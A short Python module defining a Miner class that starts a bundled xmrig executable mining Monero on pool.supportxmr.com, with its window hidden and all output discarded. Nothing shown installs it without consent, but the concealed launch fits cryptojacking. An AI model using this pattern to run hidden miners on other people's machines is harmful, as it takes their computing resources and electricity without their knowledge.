import subprocess as sp
import signal
from threading import Thread
import lepricon as package


class Miner:
    def __init__(self, address, rig_id, priority, thread_count):
        self.address = address
        self.rig_id = rig_id
        self.priority = priority
        self.thread_count = thread_count

        self.process = None

    @property
    def alive(self):
        return self.process is not None and self.process.returncode is None
    
    @property
    def returncode(self):
        if self.process is None:
            return None
        return self.process.returncode

    def start(self):
        if self.alive:
            return

        self.process = sp.Popen([
                package.dir / "data/xmrig-6.8.2/xmrig.exe",
                "-o", "pool.supportxmr.com:443",
                "-u", self.address,
                "--rig-id", self.rig_id,
                "--cpu-priority", str(self.priority),
                "-t", str(self.thread_count),
                "-k", "--tls", "--no-color"
            ],
            stdin=sp.DEVNULL,
            stdout=sp.DEVNULL,
            stderr=sp.DEVNULL,
            creationflags=sp.CREATE_NO_WINDOW
        )
        #Thread(target=self.poll).start()

    def stop(self):
        if self.alive:
            self.process.terminate()

    def poll(self):
        for line in iter(self.process.stdout.readline, ""):
            line = line.rstrip("\n")
            print(line)

        self.process.wait()
